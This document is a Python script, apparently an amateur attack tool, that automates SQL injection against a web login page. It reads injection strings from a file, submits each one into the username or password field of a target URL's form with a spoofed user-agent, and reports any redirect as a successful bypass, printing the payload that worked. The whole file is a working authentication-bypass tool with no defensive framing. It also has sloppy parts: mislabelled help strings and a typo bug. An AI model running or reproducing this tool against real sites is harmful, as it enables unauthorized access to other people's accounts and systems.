#!/usr/bin/env python3

import requests
import time
import sys
import argparse
import mechanize
import ssl

class MY_SQL_IN:
     def __init__(self):
         self.control()
         self.read_command()
     def read_command(self):
         try: 
             session = requests.session()
             list_command  = open(self.args.Code,'r')   
             list_command  = list_command .readlines()                
             for command in list_command :  
                 command  = str(command.strip())          
                 url = self.args.URL
                 request = mechanize.Browser()
                 request.set_handle_robots(False)
                 request.set_handle_redirect(True)
                 request.set_handle_refresh(True, max_time=1)
                 request.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
                 request.open(url)
                 request.select_form(nr = 0)
                 if not self.args.user and not self.args.password and not self.args.PassForm and not self.args.UserForm\
                 and not self.args.UserInput and not self.args.PassInput:
                       request["username"] = f'{command}'
                       request["password"] = 'password'  
                 elif self.args.UserForm and not self.args.user and not self.args.PassForm and not self.args.password\
                 and not self.args.UserInput and not self.args.PassInput:                   
                       request[f'{self.args.UserForm}'] = f'{command}'
                       request["password"] = 'password'
                 elif not self.args.UserForm and not self.args.user and  self.args.PassForm and  self.args.password\
                 and not self.args.UserInput and not self.args.PassInput : 
                       request['username']=f'{command}'
                       request[f'{self.args.PassForm}']=f'{self.args.password}'   
                 elif not self.args.UserForm  and self.args.PassForm and not self.args.user and not self.args.password\
                 and self.args.UserInput and not self.args.PassInput :                           
                       request['username']=f'{command}'
                       request[f'{self.args.PassForm}']='password'    
                 elif self.args.UserForm and self.args.PassForm and not self.args.user and not self.args.password\
                 and self.args.UserInput and not self.args.PassInput:   
                       request[f'{self.args.UserForm}'] = f'{command}'  
                       request[f'{self.args.PassForm}'] = 'password'                 
                 elif self.args.UserForm and self.args.PassForm and  self.args.password  and not self.args.user\
                 and not self.args.UserInput and not self.args.PassInput:
                       request[f'{self.args.UserForm}']=f'{command}'
                       request[f'{self.args.PassForm}']=f'{self.args.password}'   
                 elif self.args.UserForm and not  self.args.user and not self.args.PassForm and not self.args.password\
                 and not self.args.UserInput and not self.args.PassInput:                   
                       request[f'{self.args.UserForm}'] = 'User'
                       request["password"] =  f'{command}' 
                 elif not self.args.UserForm  and self.args.PassForm and not self.args.user and not self.args.password\
                 and not self.args.UserInput and self.args.PassInput :                           
                       request['username']='User'
                       request[f'{self.args.PassForm}']=f'{command}'   
                 elif self.args.UserForm and self.args.PassForm and self.args.user and not self.args.password\
                 and not self.args.UserInput and  self.args.PassInput :   
                       request[f'{self.args.UserForm}'] =  f'{self.args.user}' 
                       request[f'{self.args.PassForm}'] = f'{command}'                 
                 elif self.args.UserForm and self.args.PassForm and  not self.args.password  and  self.args.user\
                 and not self.args.UserInput and self.args.PassInput :
                       request[f'{self.args.UserForm}']=f'{self.args,user}'
                       request[f'{self.args.PassForm}']=f'{command}'    
                 elif not self.args.UserForm and not self.args.PassForm and not self.args.password  and not self.args.user\
                 and self.args.UserInput and self.args.PassInput :
                       request['username']=f'{command}'
                       request['password']=f'{command}'         
                 elif self.args.UserForm and self.args.PassForm and  not self.args.password  and  not self.args.user\
                 and self.args.UserInput and self.args.PassInput :
                       request[f'{self.args.UserForm}']=f'{command}'
                       request[f'{self.args.PassForm}']=f'{command}'         
                 elif self.args.UserForm and  not self.args.PassForm and not self.args.password  and  not self.args.user\
                 and self.args.UserInput and self.args.PassInput:
                       request[f'{self.args.UserForm}']=f'{command}'
                       request['password']=f'{command}'       
                 elif not self.args.UserForm and self.args.PassForm and  not self.args.password  and  not self.args.user\
                 and self.args.UserInput and self.args.PassInput:
                       request['username']=f'{command}'
                       request[f'{self.args.PassForm}']=f'{command}'  
                 else:
                     print('[!] Command Not Found')
                     exit()       
                                       
                 response   = request.submit()
                 content    = response.read()
                 passlogin  = response.geturl()       
                 if  passlogin == url :
                     print('\n[*] SLQ Injaction Command    : ', command )
                     print('[*] Login Page  URL          : ', url )                    
                     print('[*] Status                   :  NOT LOGIN') 
                     sys.stdout.write('\x1b[1A')
                     sys.stdout.write('\x1b[2K')  
                     sys.stdout.write('\x1b[1A')
                     sys.stdout.write('\x1b[2K') 
                     sys.stdout.write('\x1b[1A')
                     sys.stdout.write('\x1b[2K') 
                     sys.stdout.write('\x1b[1A')
                     sys.stdout.write('\x1b[2K')
                 else: # print('[+] Username['+'{:<6}'.format(self.args.UserForm) +"] :"+f'{ command}')
                      print('\n[*] Login URL  : ',  passlogin)
                      print('[*] SLQ Injaction Successful  Login ')
                      print('='*30+'\n'+'[!]  Credentials  : - '+'\n'+'='* 20+'\n')
                      if not self.args.user and not self.args.password and not self.args.PassForm and not self.args.UserForm\
                      and not self.args.UserInput and not self.args.PassInput:
                          print('[+] username : '+f'{command}')
                          print('[+] Password : password')
                      elif self.args.UserForm and not self.args.user and not self.args.PassForm and not self.args.password\
                      and not self.args.UserInput and not self.args.PassInput: 
                           print('[+] username['+'{:<6}'.format(self.args.UserForm) +"] : "+f'{ command}')
                           print('[+] Password           : password')
                      elif not self.args.UserForm and not self.args.user and  self.args.PassForm and  self.args.password\
                      and not self.args.UserInput and not self.args.PassInput : 
                           print('[+] username           : '+f'{command}')
                           print('[+] password['+'{:<6}'.format(self.args.PassForm)+'] : '+f'{self.args.password}')  
                      elif not self.args.UserForm  and self.args.PassForm and not self.args.user and not self.args.password\
                      and self.args.UserInput and not self.args.PassInput :  
                           print('[+] username           : '+f'{ command}')
                           print('[+] password['+'{:<6}'.format(self.args.PassForm)+'] : '+'password')  
                      elif self.args.UserForm and self.args.PassForm and not self.args.user and not self.args.password\
                      and  self.args.UserInput and not self.args.PassInput:  
                           print('[+] username['+'{:<6}'.format(self.args.UserForm)+'] : '+f'{ command}')
                           print('[+] password['+'{:<6}'.format(self.args.PassForm)+'] : '+'password') 
                      elif self.args.UserForm and self.args.PassForm and  self.args.password  and not self.args.user\
                      and not self.args.UserInput and not self.args.PassInput: 
                           print('[+] username['+'{:<6}'.format(self.args.UserForm)+'] : '+f'{ command}')
                           print('[+] password['+'{:<6}'.format(self.args.PassForm)+'] : '+f'{self.args.password}')                             
                      elif self.args.UserForm and not  self.args.user and not self.args.PassForm and not self.args.password\
                      and not self.args.UserInput and not self.args.PassInput:  
                           print('[+] username['+'{:<6}'.format(self.args.UserForm)+'] : '+f'{ self.args.user}')
                           print('[+] password['+f'{ command}')   
                      elif self.args.UserForm and self.args.PassForm and self.args.user and not self.args.password\
                      and not self.args.UserInput and  self.args.PassInput :
                           print('[+] username['+'{:<6}'.format(self.args.UserForm)+']  : User')
                           print('[+] password['+'{:<6}'.format(self.args.PassForm)+'] : '+f'{command}')    
                      elif self.args.UserForm and self.args.PassForm and not  self.args.user and not self.args.password\
                      and self.args.PassInput and not self.args.UserInput :  
                           print('[+] username['+'{:<6}'.format(self.args.UserForm)+'] : User')
                           print('[+] password['+'{:<6}'.format(self.args.PassForm)+'] : '+f'{command}')    
                      elif self.args.UserForm and self.args.PassForm and  not self.args.password  and  self.args.user\
                      and not self.args.UserInput and self.args.PassInput :    
                           print('[+] username['+'{:<6}'.format(self.args.UserForm)+'] :'+f'{self.args.user}')
                           print('[+] password['+'{:<6}'.format(self.args.PassForm)+'] : '+f'{command}') 
                      elif not self.args.UserForm and not self.args.PassForm and not self.args.password  and not self.args.user\
                      and self.args.UserInput and self.args.PassInput : 
                           print('[+] username : '+f'{command}')
                           print('[+] password : '+f'{command}')
                      elif self.args.UserForm and self.args.PassForm and not self.args.password and not self.args.user\
                      and  self.args.UserInput and self.args.PassInput :     
                           print('[+] username['+'{:<6}'.format(self.args.UserForm)+'] : '+f'{command}')
                           print('[+] password['+'{:<6}'.format(self.args.PassForm)+'] : '+f'{command}')
                      elif self.args.UserForm and  not self.args.PassForm and not self.args.password  and not self.args.user\
                      and self.args.UserInput and self.args.PassInput:     
                           print('[+] username['+'{:<6}'.format(self.args.UserForm)+'] : '+f'{command}')
                           print('[+] password           : '+f'{command}')                         
                      elif not self.args.UserForm and self.args.PassForm and  not self.args.password  and  not self.args.user\
                      and self.args.UserInput and self.args.PassInput:     
                          print('[+] username           : '+f'{command}')
                          print('[+] password['+'{:<6}'.format(self.args.PassForm)+'] : '+f'{command}')                         
                      exit()
                      
             print('[!] Web May Not Vulnerable To SQL Injaction ')
             print('[*] Saugger To Use anther list Command ')   
         except KeyboardInterrupt:
              exit()
       
     def control(self):
        
        #print(B+"")
        parser = argparse.ArgumentParser(description="Usage: [OPtion] [arguments] [ -w ] [arguments]")      
        parser.add_argument("-u",'--URL'        , action=None    ,help ="target url loign page") 
        parser.add_argument("-c","--Code"       , action=None    ,help ="wordlist of passwords") 
        parser.add_argument("-UF","--UserForm"  , action=None    ,help ="wordlist of passwords")
        parser.add_argument("-PF","--PassForm"  , action=None    ,help ="wordlist of passwords")
        parser.add_argument("-PI","--PassInput"  , action='store_true'    ,help ="wordlist of passwords")
        parser.add_argument("-UI","--UserInput"  , action='store_true'     ,help ="wordlist of passwords")
        parser.add_argument("-U","--user"       , action=None    ,help ="Show the Hash Supporting  and Information")   
        parser.add_argument("-P","--password"   , action=None    ,help ="set color display off")      
        parser.add_argument("-r","--read"       , action=None    ,help ="read the hash from file input")            
        self.args = parser.parse_args()  
#        print(W+"")
        if len(sys.argv)!=1 :
            pass
        else:
            parser.print_help()        
            exit() 
if __name__=='__main__':
   MY_SQL_IN()    